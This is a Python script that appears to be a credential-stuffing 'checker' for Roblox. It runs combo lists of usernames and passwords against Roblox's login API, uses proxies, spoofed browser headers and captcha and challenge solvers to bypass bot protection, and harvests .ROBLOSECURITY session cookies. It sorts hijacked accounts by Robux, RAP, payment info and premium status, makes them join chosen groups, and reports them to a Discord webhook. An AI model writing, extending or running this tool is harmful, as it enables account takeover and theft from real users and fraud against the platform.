import sys, os
from time import sleep
from json import loads, dumps
from base64 import b64decode, b64encode
from custom_solver import get_token
from thread_lock import ThreadLock
from counter import Counter
from session import Session
from output import Output
from account_info import AccountInfo
from auth_intent import AuthIntent
from rostile import Rostile
from util import Util

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

config = Util.get_config()

WEBHOOK_ENABLED = config["logWebhook"]
GROUP_IDS = config.get("groupIds", [])

if WEBHOOK_ENABLED == True:
    from discord_webhook import DiscordWebhook, DiscordEmbed

if type(WEBHOOK_ENABLED) != bool:
    Output("ERROR").log("You must put either true/false for webhook enabled")

WEBHOOK = config["webhook"]

def load_already_joined():
    """Load sets of usernames that already joined each group from output files."""
    joined = {}
    for gid in GROUP_IDS:
        joined[gid] = set()
        filepath = f"output/group_joins/group_{gid}.txt"
        if os.path.exists(filepath):
            with open(filepath, "r", encoding="utf-8") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if parts:
                        joined[gid].add(parts[0].lower())
    return joined

ALREADY_JOINED = load_already_joined() if GROUP_IDS else {}

class Roblox:
    def __init__(self, lock: ThreadLock, counter: Counter, accounts) -> None:
        self.account = None
        self.attempts = 0
        self.checked = False
        self.lock = lock
        self.counter = counter
        self.accounts = accounts

    def continue_check(self, continue_payload) -> None:
        sleep(1)

        continue_payload_content = dumps(continue_payload).replace(" ", "").encode("utf-8")

        response = self.session.post('https://apis.roblox.com/challenge/v1/continue', content=continue_payload_content)

        if response.json().get("challengeType") == "captcha":
            return loads(response.json()["challengeMetadata"])

        if response.status_code != 200:
            raise ValueError("Rejected by continue API")

        payload = {
            "ctype": self.ctype,
            "cvalue": self.account[0],
            "password": self.account[1],
            "secureAuthenticationIntent": self.sec_auth_intent
        }

        self.session.headers = {
            **self.session.headers,
            "rblx-challenge-id": continue_payload["challengeId"],
            "rblx-challenge-metadata": b64encode(continue_payload["challengeMetadata"].encode("utf-8")).decode("utf-8"),
            "rblx-challenge-type": continue_payload["challengeType"]
        }

        response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        csrf = response.headers.get("x-csrf-token")

        if csrf != None:
            self.session.headers = {
                **self.session.headers,
                "x-csrf-token": csrf
            }

            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

        temp_dict = self.session.headers.copy()

        temp_dict.pop("rblx-challenge-id")
        temp_dict.pop("rblx-challenge-metadata")
        temp_dict.pop("rblx-challenge-type")

        self.session.headers = temp_dict

        if response.status_code == 429:
            raise ValueError("Rate limited")
        
        if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
            return response.json()
        
        if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
            self.account[0] = response.json()["user"]["name"]

            return [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]
            
        elif "Challenge failed" in response.text:
            raise ValueError("Rejected by login API")

        else:
            raise ValueError("invalid")

    def check(self) -> dict:
        while True:
            try:
                if self.counter.get_value() >= len(self.accounts):
                    return

                if self.account == None or self.checked == True:
                    self.checked = False
                    self.attempts = 0

                    with self.lock.get_lock():
                        self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                        self.counter.increment()
                else:
                    if self.attempts == 10:
                        self.checked = False
                        self.attempts = 0

                        with self.lock.get_lock():
                            self.account = self.accounts[self.counter.get_value()].strip("\n").split(":")
                            self.counter.increment()

                        Output("ERROR").log(f"Invalid account | {self.account[0]}")

                        with open("output/invalid.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                
                # Skip account entirely if already in all groups
                if GROUP_IDS and all(self.account[0].lower() in ALREADY_JOINED.get(gid, set()) for gid in GROUP_IDS):
                    Output("INFO").log(f"Skipping account (already in all groups) | {self.account[0]}")
                    self.checked = True
                    continue

                Output("INFO").log(f"Checking account | {self.account[0]}")

                self.session, self.sec_ch_ua, self.user_agent, self.proxy = Session().session()
                self.accept_language = f'{Util.get_random_string()};q=0.9,en;q=0.8'

                self.session.headers = {
                    'sec-ch-ua': self.sec_ch_ua,
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'upgrade-insecure-requests': '1',
                    'user-agent': self.user_agent,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'priority': 'u=0, i'
                }

                response = self.session.get("https://www.roblox.com/login")
                cookie_header = '; '.join([f"{key}={value}" for key, value in response.cookies.items()])

                self.session.headers = {
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua': self.sec_ch_ua,
                    'sec-ch-ua-mobile': '?0',
                    'user-agent': self.user_agent,
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json;charset=UTF-8',
                    'origin': 'https://www.roblox.com',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'priority': 'u=1, i',
                    "cookie": cookie_header
                }
                
                self.ctype = "Username" if "@" not in self.account[0] else "Email"
                self.sec_auth_intent = AuthIntent.get_auth_intent(self.session)

                payload = {
                    "ctype": self.ctype,
                    "cvalue": self.account[0],
                    "password": self.account[1],
                    "secureAuthenticationIntent": self.sec_auth_intent
                }

                response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise ValueError("Rate limited")

                csrf = response.headers.get("x-csrf-token")

                self.session.headers = {
                    'sec-ch-ua-platform': '"Windows"',
                    'x-csrf-token': csrf,
                    'user-agent': self.user_agent,
                    'accept': 'application/json, text/plain, */*',
                    'sec-ch-ua': self.sec_ch_ua,
                    'content-type': 'application/json;charset=UTF-8',
                    'sec-ch-ua-mobile': '?0',
                    'origin': 'https://www.roblox.com',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.roblox.com/',
                    'accept-encoding': 'gzip, deflate, br, zstd',
                    'accept-language': self.accept_language,
                    'cookie': cookie_header,
                    'priority': 'u=1, i'
                }

                response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                if response.status_code == 429:
                    raise ValueError("Rate limited")
                
                if self.ctype == "Email" and "Received credentials belong to multiple accounts" in response.text:
                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")

                    self.handle_multi(user_id_and_cookie)

                    self.checked = True
                    continue

                if response.status_code == 200 and ".ROBLOSECURITY" in response.cookies:
                    user_id_and_cookie = [response.json()["user"]["id"], response.cookies.get(".ROBLOSECURITY")]

                    self.account[0] = response.json()["user"]["name"]

                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")

                    cookie_header += f"; .ROBLOSECURITY={response.cookies.get('.ROBLOSECURITY')}"

                    self.handle_valid(user_id_and_cookie, cookie_header)
                    
                    self.checked = True
                    continue
                
                elif "Challenge" in response.text:
                    pass

                else:
                    raise ValueError("invalid")
                
                challenge_type = response.headers.get("rblx-challenge-type")

                if challenge_type == "denied":
                    raise ValueError("Challenge type denied")

                challenge_id = response.headers.get("rblx-challenge-id")
                metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
                blob = metadata.get("dataExchangeBlob")
                captcha_id = metadata.get("unifiedCaptchaId")

                if cookie_header.endswith("; "):
                    cookie_header = cookie_header[:-2]

                if challenge_type == "rostile":
                    Output("CAPTCHA").log("Rostile detected")

                    payload = Rostile.get_solution(challenge_id)

                    redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload)

                    csrf = redemption_token.headers.get("x-csrf-token")

                    if csrf != None:
                        self.session.headers = {
                            **self.session.headers,
                            "x-csrf-token": csrf
                        }

                        redemption_token = self.session.post('https://apis.roblox.com/rostile/v1/verify', json=payload).json()["redemptionToken"]
                    else:
                        redemption_token = redemption_token.json()["redemptionToken"]

                    challenge_metadata = dumps({
                        "redemptionToken": redemption_token
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "rostile",
                        "challengeMetadata": challenge_metadata
                    }

                    continue_result = self.continue_check(payload)

                    if type(continue_result) == dict:
                        captcha_id = continue_result.get("unifiedCaptchaId")
                        blob = continue_result.get("dataExchangeBlob")

                        Output("CAPTCHA").log("Captcha detected")
                    
                        Output("CAPTCHA").log("Solving captcha")

                        solution = get_token(self.session, blob, self.proxy)

                        if solution == None:
                            raise ValueError("Failed to solve captcha")
                        
                        token = solution.split("|")[0]
                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                        
                        challenge_metadata = dumps({
                            "unifiedCaptchaId": captcha_id,
                            "captchaToken": solution,
                            "actionType": "Login"
                        }, separators=(',', ':'))

                        payload = {
                            "challengeId": challenge_id,
                            "challengeType": "captcha",
                            "challengeMetadata": challenge_metadata
                        }

                        user_id_and_cookie = self.continue_check(payload)
                    else:
                        user_id_and_cookie = continue_result

                elif challenge_type == "privateaccesstoken":
                    Output("CAPTCHA").log("PAT detected")

                    payload = {"challengeId": challenge_id}

                    response = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload)

                    self.session.headers["Authorization"] = f"PrivateToken token={response.headers['www-authenticate'].split('challenge=')[1]}"

                    redemption_token = self.session.post("https://apis.roblox.com/private-access-token/v1/getPATToken", json=payload).json()["redemptionToken"]

                    challenge_metadata = dumps({
                        "redemptionToken": redemption_token
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "privateaccesstoken",
                        "challengeMetadata": challenge_metadata
                    }

                    continue_result = self.continue_check(payload)

                    if type(continue_result) == dict:
                        captcha_id = continue_result.get("unifiedCaptchaId")
                        blob = continue_result.get("dataExchangeBlob")

                        Output("CAPTCHA").log("Captcha detected")
                    
                        Output("CAPTCHA").log("Solving captcha")

                        solution = get_token(self.session, blob, self.proxy)

                        if solution == None:
                            raise ValueError("Failed to solve captcha")
                        
                        token = solution.split("|")[0]
                        token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                        Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                        
                        challenge_metadata = dumps({
                            "unifiedCaptchaId": captcha_id,
                            "captchaToken": solution,
                            "actionType": "Login"
                        }, separators=(',', ':'))

                        payload = {
                            "challengeId": challenge_id,
                            "challengeType": "captcha",
                            "challengeMetadata": challenge_metadata
                        }

                        user_id_and_cookie = self.continue_check(payload)
                    else:
                        user_id_and_cookie = continue_result

                else:
                    Output("CAPTCHA").log("Captcha detected")
                    
                    Output("CAPTCHA").log("Solving captcha")

                    solution = get_token(self.session, blob, self.proxy)

                    attmepts = 1

                    if solution == None:
                        while True:
                            Output("CAPTCHA").log("Retrying captcha")

                            if attmepts == 2:
                                raise ValueError("Failed to solve captcha.")

                            response = self.session.post("https://auth.roblox.com/v2/login", json=payload)

                            if response.status_code == 429:
                                raise ValueError("Rate limited")

                            challenge_type = response.headers.get("rblx-challenge-type")

                            if challenge_type == "denied":
                                raise ValueError("Challenge type denied")

                            challenge_id = response.headers.get("rblx-challenge-id")
                            metadata = loads(b64decode(response.headers.get("rblx-challenge-metadata").encode("utf-8")).decode("utf-8"))
                            blob = metadata.get("dataExchangeBlob")
                            captcha_id = metadata.get("unifiedCaptchaId")

                            solution = get_token(self.session, blob, self.proxy)

                            if solution != None:
                                break
                            
                            attmepts += 1

                    token = solution.split("|")[0]
                    token_info = solution.split("pk=476068BF-9607-4799-B53D-966BE98E2B81|")[1].split("|cdn_url=")[0]

                    Output("CAPTCHA").log(f"Solved captcha | {token}|{token_info}")
                    
                    challenge_metadata = dumps({
                        "unifiedCaptchaId": captcha_id,
                        "captchaToken": solution,
                        "actionType": "Login"
                    }, separators=(',', ':'))

                    payload = {
                        "challengeId": challenge_id,
                        "challengeType": "captcha",
                        "challengeMetadata": challenge_metadata
                    }

                    user_id_and_cookie = self.continue_check(payload)

                if type(user_id_and_cookie) == dict:
                    Output("SUCCESS").log(f"Valid account | {self.account[0]}")

                    self.handle_multi(user_id_and_cookie)

                    self.checked = True
                    continue

                Output("SUCCESS").log(f"Valid account | {self.account[0]}")

                cookie_header += f"; .ROBLOSECURITY={user_id_and_cookie[1]}"

                self.handle_valid(user_id_and_cookie, cookie_header)

                self.checked = True

            except Exception as e:
                if str(e) == "invalid":
                    self.checked = True

                    Output("ERROR").log(f"Invalid account | {self.account[0]}")

                    with self.lock.get_lock():
                        with open("output/invalid.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}\n')
                else:
                    Output("ERROR").log(str(e))

                    self.attempts += 1

    def handle_valid(self, user_id_and_cookie, cookie_header) -> None:
        with self.lock.get_lock():
            with open("output/valid.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        self.session.headers = {
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua': self.sec_ch_ua,
            'sec-ch-ua-mobile': '?0',
            'user-agent': self.user_agent,
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.roblox.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.roblox.com/',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': self.accept_language,
            'priority': 'u=1, i',
            "cookie": cookie_header
        }

        acc_info = AccountInfo.get_account_info(self.session, user_id_and_cookie[0])

        if GROUP_IDS:
            from account_info import join_group
            for gid in GROUP_IDS:
                if self.account[0].lower() in ALREADY_JOINED.get(gid, set()):
                    Output("INFO").log(f"Already in group {gid} | {self.account[0]}")
                    continue
                joined = join_group(self.session, gid)
                if joined:
                    Output("SUCCESS").log(f"Joined group {gid} | {self.account[0]}")
                    ALREADY_JOINED.setdefault(gid, set()).add(self.account[0].lower())
                    with self.lock.get_lock():
                        with open(f"output/group_joins/group_{gid}.txt", "a", encoding="utf-8") as file:
                            file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
                else:
                    Output("ERROR").log(f"Failed to join group {gid} | {self.account[0]}")

        if WEBHOOK_ENABLED:
            try:
                webhook = DiscordWebhook(url=WEBHOOK, content="@here")

                embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='00FF00')

                for key, value in acc_info.items():
                    embed.add_embed_field(name=key, value=value, inline=True)

                embed.set_timestamp()

                webhook.add_embed(embed)
                webhook.execute()
            except:
                pass

        with self.lock.get_lock():
            with open(f"output/robux/robux{acc_info['robux']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        with self.lock.get_lock():
            with open(f"output/rap/rap{acc_info['rap']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        
        with self.lock.get_lock():
            with open(f"output/pending/pending{acc_info['pending']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        with self.lock.get_lock():
            with open(f"output/summary/summary{acc_info['summary']}.txt", "a", encoding="utf-8") as file:
                file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        if acc_info["payment_info"] == True:
            with self.lock.get_lock():
                with open(f"output/payment_info/payment_info.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        
        elif acc_info["payment_info"] == "_unknown":
            with self.lock.get_lock():
                with open(f"output/payment_info/payment_info_unknown.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')
        
        if acc_info["premium"] == True:
            with self.lock.get_lock():
                with open(f"output/premium/premium.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

        elif acc_info["premium"] == "_unknown":
            with self.lock.get_lock():
                with open(f"output/premium/premium_unknown.txt", "a", encoding="utf-8") as file:
                    file.write(f'{self.account[0]}:{self.account[1]}:{user_id_and_cookie[1]}\n')

    def handle_multi(self, user_id_and_cookie) -> None:
        multiple_accounts_list = []

        multiple_accounts = loads(user_id_and_cookie["errors"][0]["fieldData"])["users"]

        for multiple_account in multiple_accounts:
            multiple_accounts_list.append(f'{multiple_account.get("name")}:{self.account[1]}\n')

        with self.lock.get_lock():
            with open("output/multiple_linked.txt", "a", encoding="utf-8") as file:
                file.writelines(multiple_accounts_list)

        if WEBHOOK_ENABLED:
            try:
                webhook = DiscordWebhook(url=WEBHOOK, content="@here")

                embed = DiscordEmbed(title=f'**Username: {self.account[0]}**', color='00FF00')

                embed.set_timestamp()

                webhook.add_embed(embed)
                webhook.execute()
            except:
                pass